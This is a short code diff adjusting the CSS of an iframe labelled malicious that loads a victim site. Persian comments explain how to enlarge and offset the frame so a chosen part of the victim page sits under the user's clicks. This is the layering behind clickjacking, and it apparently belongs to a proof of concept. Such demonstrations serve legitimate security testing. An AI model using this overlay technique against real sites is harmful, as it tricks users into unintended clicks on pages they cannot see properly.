@@ -42,10 +42,15 @@
         /* The malicious iframe loading the victim site */
         .malicious-iframe {
             position: absolute;
-            top: -339px;
-            left: 0px;
-            width: 100%;
-            height: 100%;
+
+            /* ۱. فریم را بسیار بزرگ می‌کنیم تا کل صفحه قربانی رندر شود و به هم نریزد */
+            width: 1200px;
+            height: 1500px;
+
+            /* ۲. با مقادیر منفی، فریم را به بالا و چپ هول می‌دهیم (مانند یک اسکرول مخفی) */
+            top: -500px; /* این عدد را تغییر دهید تا صفحه به بالا/پایین حرکت کند */
+            left: -100px; /* این عدد را تغییر دهید تا صفحه به چپ/راست حرکت کند */
+
             border: none;
             z-index: 2;
             opacity: 0.4;
